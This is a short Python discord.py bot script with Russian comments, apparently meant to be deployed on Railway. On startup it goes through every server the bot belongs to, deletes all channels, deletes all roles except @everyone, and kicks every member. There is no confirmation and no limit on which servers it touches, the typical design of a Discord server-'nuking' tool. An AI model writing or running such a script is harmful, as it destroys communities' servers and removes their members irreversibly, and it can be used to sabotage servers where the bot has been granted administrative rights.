import discord
import asyncio
import sys
import os

# Берём токен из переменной DICORD_TOKEN (как у тебя в Railway)
TOKEN = os.getenv('DICORD_TOKEN')

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

client = discord.Client(intents=intents)

def log(message):
    print(message)
    sys.stdout.flush()

@client.event
async def on_ready():
    log(f"✅ Бот {client.user} запущен!")
    log(f"📊 На серверах: {len(client.guilds)}")
    log("=" * 50)
    
    for guild in client.guilds:
        log(f"\n🔥 ОЧИСТКА: {guild.name} (ID: {guild.id})")
        
        # Удаляем каналы
        log("  📁 Удаление каналов...")
        for channel in guild.channels:
            try:
                await channel.delete()
                log(f"    ✓ {channel.name}")
                await asyncio.sleep(0.3)
            except Exception as e:
                log(f"    ✗ {channel.name}: {e}")
        
        # Удаляем роли
        log("  🎭 Удаление ролей...")
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    log(f"    ✓ {role.name}")
                    await asyncio.sleep(0.3)
                except Exception as e:
                    log(f"    ✗ {role.name}: {e}")
        
        # Кикаем всех
        log("  👢 Кик участников...")
        for member in guild.members:
            if member != client.user:
                try:
                    await member.kick(reason="Очистка сервера")
                    log(f"    ✓ {member.name}")
                    await asyncio.sleep(0.3)
                except Exception as e:
                    log(f"    ✗ {member.name}: {e}")
        
        log(f"  ✅ {guild.name} ОЧИЩЕН")
    
    log("\n🎉 ВСЕ СЕРВЕРЫ ОЧИЩЕНЫ!")
    await client.close()

if __name__ == "__main__":
    if not TOKEN:
        log("❌ Токен не найден! Переменная DICORD_TOKEN не установлена в Railway")
        sys.exit(1)
    
    log("🚀 ЗАПУСК БОТА ОЧИСТКИ")
    client.run(TOKEN)
